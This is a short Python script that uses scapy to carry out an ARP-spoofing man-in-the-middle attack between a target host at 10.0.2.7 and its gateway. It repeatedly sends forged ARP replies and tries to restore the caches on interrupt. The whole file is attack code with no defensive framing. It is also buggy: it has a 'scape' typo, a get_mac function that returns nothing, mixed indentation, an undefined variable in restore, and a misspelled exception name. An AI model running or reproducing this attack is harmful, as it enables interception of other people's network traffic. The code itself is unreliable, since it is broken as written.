import scapy.all as scapy
import time
import sys

def get_mac(ip):
	arp_request = scape.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=spoof_ip, hwsrc=source_mac)
    scapy.send(packet, count=4)


target_ip = "10.0.2.7"
# ip of windows machine
gateway_ip = "10.0.2.1"
# ip of router

try:
	packet_sent_count = 0
	while True:
		spoof(target_ip, gateway_ip)
		spoof(gateway_ip, target_ip)
		packet_sent_count += 2
		print("\r[+] Packets sent: " + str(packet_sent_count), end="")
		time.sleep(2)
except KeyboradInterrupt:
	print("\n[-] Detected CTRL + C ... Resetting ARP tables..... Please wait.\n")
	restore(target_ip, gateway_ip)
	restore(gateway_ip, target_ip)